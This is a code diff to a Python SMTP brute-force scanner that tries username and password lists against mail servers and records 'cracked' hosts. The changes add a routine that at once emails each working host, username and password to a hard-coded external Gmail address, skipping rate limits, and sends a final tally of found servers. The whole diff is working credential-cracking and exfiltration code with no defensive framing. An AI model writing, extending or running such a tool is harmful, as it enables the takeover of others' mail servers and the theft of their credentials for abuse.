@@ -21,10 +21,11 @@ NOTIFY_EMAIL = "skkho87.sm@gmail.com"
 # ---------------------------------------
 
 # --- NOTIFICATION SETTINGS ---
-MIN_NOTIFICATION_INTERVAL = 300  # 5 minutes between notifications for same host
-MAX_NOTIFICATIONS_PER_HOUR = 20  # Maximum notifications per hour
+MIN_NOTIFICATION_INTERVAL = 60   # Reduced to 1 minute for working SMTPs
+MAX_NOTIFICATIONS_PER_HOUR = 50  # Increased limit for working SMTPs
 ONLY_NOTIFY_WORKING_SMTP = True  # Only notify for servers with valid authentication
 NOTIFY_LIVE_SERVERS = False      # Set to True if you want notifications for just live servers
+FORCE_WORKING_SMTP_EMAILS = True # Force immediate email for working SMTPs regardless of limits
 # -----------------------------
 
 # Setup logging
@@ -42,7 +43,10 @@ logger = logging.getLogger(__name__)
 notification_tracker = {
     'last_notification_time': {},
     'hourly_count': 0,
-    'hour_start': datetime.now()
+    'hour_start': datetime.now(),
+    'working_smtp_count': 0,
+    'emails_sent': 0,
+    'email_failures': 0
 }
 
 # Load notification history if exists
@@ -50,7 +54,8 @@ notification_file = 'notification_history.json'
 if os.path.exists(notification_file):
     try:
         with open(notification_file, 'r') as f:
-            notification_tracker = json.load(f)
+            data = json.load(f)
+            notification_tracker.update(data)
             # Convert string timestamps back to datetime objects
             for host in notification_tracker.get('last_notification_time', {}):
                 notification_tracker['last_notification_time'][host] = datetime.fromisoformat(
@@ -104,7 +109,7 @@ except ValueError:
 bad = open('bad.txt', 'w', encoding='utf-8')
 val = open('valid.txt', 'a', encoding='utf-8')
 live_servers = open('live_smtp_servers.txt', 'a', encoding='utf-8')
-working_smtp = open('working_smtp_servers.txt', 'a', encoding='utf-8')  # New file for fully working SMTPs
+working_smtp = open('working_smtp_servers.txt', 'a', encoding='utf-8')
 
 # Load already cracked hosts to avoid duplicates
 cracked = []
@@ -152,8 +157,13 @@ def GetDomainFromBanner(banner):
         logger.error(f"Error parsing banner: {e}")
         return "unknown.domain"
 
-def can_send_notification(host):
+def can_send_notification(host, is_working_smtp=False):
     """Check if we can send notification based on rate limiting"""
+    # For working SMTPs, bypass rate limiting if FORCE_WORKING_SMTP_EMAILS is True
+    if is_working_smtp and FORCE_WORKING_SMTP_EMAILS:
+        logger.info(f"Forcing email notification for working SMTP: {host}")
+        return True
+    
     now = datetime.now()
     
     # Reset hourly counter if needed
@@ -175,9 +185,86 @@ def can_send_notification(host):
     
     return True
 
-def send_email_notification(subject, body, host):
+def test_email_connection():
+    """Test if email configuration is working"""
+    try:
+        logger.info("Testing email connection...")
+        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+        server.starttls()
+        server.login(SMTP_USER, SMTP_PASS)
+        server.quit()
+        logger.info("Email connection test successful!")
+        return True
+    except Exception as e:
+        logger.error(f"Email connection test failed: {e}")
+        return False
+
+def send_working_smtp_email(host, user, password, validation_info, banner_info):
+    """Send immediate email notification for working SMTP - bypasses rate limiting"""
+    try:
+        logger.info(f"🎯 SENDING WORKING SMTP EMAIL FOR: {host}")
+        
+        msg = MIMEMultipart()
+        msg['Subject'] = f"🔥 WORKING SMTP FOUND: {host}"
+        msg['From'] = SMTP_USER
+        msg['To'] = NOTIFY_EMAIL
+        
+        # Create detailed email body for working SMTP
+        email_body = f"""🔥 WORKING SMTP SERVER DISCOVERED! 🔥
+{'='*50}
+
+🎯 SMTP DETAILS:
+Host: {host}
+Username: {user}
+Password: {password}
+Status: ✅ FULLY AUTHENTICATED & WORKING
+
+📊 TECHNICAL INFO:
+{validation_info}
+Banner: {banner_info}
+
+⏰ DISCOVERY TIME:
+{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+🛠️ SCANNER INFO:
+Scanner Host: {socket.gethostname()}
+Thread Count: {ThreadNumber}
+Working SMTP Count: {notification_tracker['working_smtp_count'] + 1}
+
+{'='*50}
+This SMTP server is ready to use!
+"""
+        
+        msg.attach(MIMEText(email_body, 'plain'))
+
+        # Send the email
+        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+        server.starttls()
+        server.login(SMTP_USER, SMTP_PASS)
+        server.sendmail(SMTP_USER, [NOTIFY_EMAIL], msg.as_string())
+        server.quit()
+        
+        # Update tracking
+        notification_tracker['last_notification_time'][host] = datetime.now()
+        notification_tracker['hourly_count'] += 1
+        notification_tracker['working_smtp_count'] += 1
+        notification_tracker['emails_sent'] += 1
+        save_notification_history()
+        
+        logger.info(f"✅ WORKING SMTP EMAIL SENT SUCCESSFULLY: {host}")
+        print(f"🚨 EMAIL SENT FOR WORKING SMTP: {host} -> {user}")
+        return True
+        
+    except Exception as e:
+        notification_tracker['email_failures'] += 1
+        logger.error(f"❌ FAILED TO SEND WORKING SMTP EMAIL for {host}: {e}")
+        print(f"❌ EMAIL FAILED for {host}: {e}")
+        return False
+
+def send_email_notification(subject, body, host, is_working_smtp=False):
     """Send email notification for important findings with rate limiting"""
-    if not can_send_notification(host):
+    if not can_send_notification(host, is_working_smtp):
+        logger.info(f"Rate limiting prevented notification for {host}")
         return False
     
     try:
@@ -196,6 +283,8 @@ Scanner Details:
 - Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 - Scanner Host: {socket.gethostname()}
 - Thread Count: {ThreadNumber}
+- Emails Sent: {notification_tracker['emails_sent']}
+- Email Failures: {notification_tracker['email_failures']}
 
 This is an automated notification from your SMTP scanner.
 """
@@ -211,11 +300,13 @@ This is an automated notification from your SMTP scanner.
         # Update tracking
         notification_tracker['last_notification_time'][host] = datetime.now()
         notification_tracker['hourly_count'] += 1
+        notification_tracker['emails_sent'] += 1
         save_notification_history()
         
         logger.info(f"Email notification sent: {subject}")
         return True
     except Exception as e:
+        notification_tracker['email_failures'] += 1
         logger.error(f"Failed to send email notification: {e}")
         return False
 
@@ -310,18 +401,21 @@ class SMTPScanner(threading.Thread):
                     cracked.append(host)
                     
                     # Log to working SMTP file
-                    working_smtp.write(f"{host} {auth_details['user']} {auth_details['password']} - {validation_info}\n")
+                    working_smtp_line = f"{host} {auth_details['user']} {auth_details['password']} - {validation_info}\n"
+                    working_smtp.write(working_smtp_line)
                     working_smtp.flush()
                     
-                    # Send notification for working SMTP (both live and authenticated)
-                    subject = f"Working SMTP Server Found: {host}"
-                    body = f"""Host: {host}
-User: {auth_details['user']}
-Password: {auth_details['password']}
-Validation: {validation_info}
-Status: FULLY WORKING (Live + Authenticated)"""
+                    print(f"🎯 WORKING SMTP FOUND: {host} {auth_details['user']} {auth_details['password']}")
                     
-                    send_email_notification(subject, body, host)
+                    # IMMEDIATELY send email for working SMTP
+                    send_working_smtp_email(
+                        host, 
+                        auth_details['user'], 
+                        auth_details['password'], 
+                        validation_info, 
+                        auth_details['banner']
+                    )
+                    
                     return True
             
             return True
@@ -387,7 +481,7 @@ Status: FULLY WORKING (Live + Authenticated)"""
                 
                 if data[:3] == '235':
                     # Authentication successful
-                    logger.info(f"Valid credentials found: {host} {userd} {pwd2}")
+                    logger.info(f"🎯 VALID CREDENTIALS FOUND: {host} {userd} {pwd2}")
                     val.write(f"{host} {userd} {pwd2}\n")
                     val.flush()
                     
@@ -413,6 +507,13 @@ def main(users, passwords, thread_number):
     """Main scanning function"""
     logger.info(f"Starting SMTP scanner with {thread_number} threads")
     logger.info(f"Notification settings: Only working SMTPs={ONLY_NOTIFY_WORKING_SMTP}, Live servers={NOTIFY_LIVE_SERVERS}")
+    logger.info(f"Force working SMTP emails: {FORCE_WORKING_SMTP_EMAILS}")
+    
+    # Test email connection at startup
+    if test_email_connection():
+        logger.info("✅ Email system ready!")
+    else:
+        logger.warning("❌ Email system may have issues!")
     
     q = queue.Queue(maxsize=40000)
     
@@ -448,20 +549,38 @@ def main(users, passwords, thread_number):
     q.join()
     logger.info("Scanning completed")
     
-    # Send summary notification
+    # Send final summary
     try:
-        with open('working_smtp_servers.txt', 'r') as f:
-            working_count = len(f.readlines())
+        working_count = notification_tracker['working_smtp_count']
+        emails_sent = notification_tracker['emails_sent']
+        email_failures = notification_tracker['email_failures']
+        
+        subject = f"SMTP Scan Complete - {working_count} Working Servers Found"
+        body = f"""Final Scan Summary:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📊 RESULTS:
+• Working SMTP servers: {working_count}
+• Emails sent: {emails_sent}
+• Email failures: {email_failures}
+• Thread count used: {thread_number}
+
+⏰ COMPLETED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+📁 Check these files for details:
+• working_smtp_servers.txt - Fully working SMTPs
+• valid.txt - Valid credentials
+• live_smtp_servers.txt - Live servers
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+        
+        send_email_notification(subject, body, "final_summary")
         
         if working_count > 0:
-            subject = f"SMTP Scan Complete - {working_count} Working Servers Found"
-            body = f"""Scan Summary:
-- Total working SMTP servers: {working_count}
-- Thread count used: {thread_number}
-- Scan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
-Check working_smtp_servers.txt for full details."""
-            send_email_notification(subject, body, "summary")
+            logger.info(f"🎯 SCAN COMPLETE: {working_count} working SMTP servers found and emailed!")
+        else:
+            logger.info("Scan complete: No working SMTP servers found.")
+            
     except Exception as e:
         logger.error(f"Could not send summary notification: {e}")
 
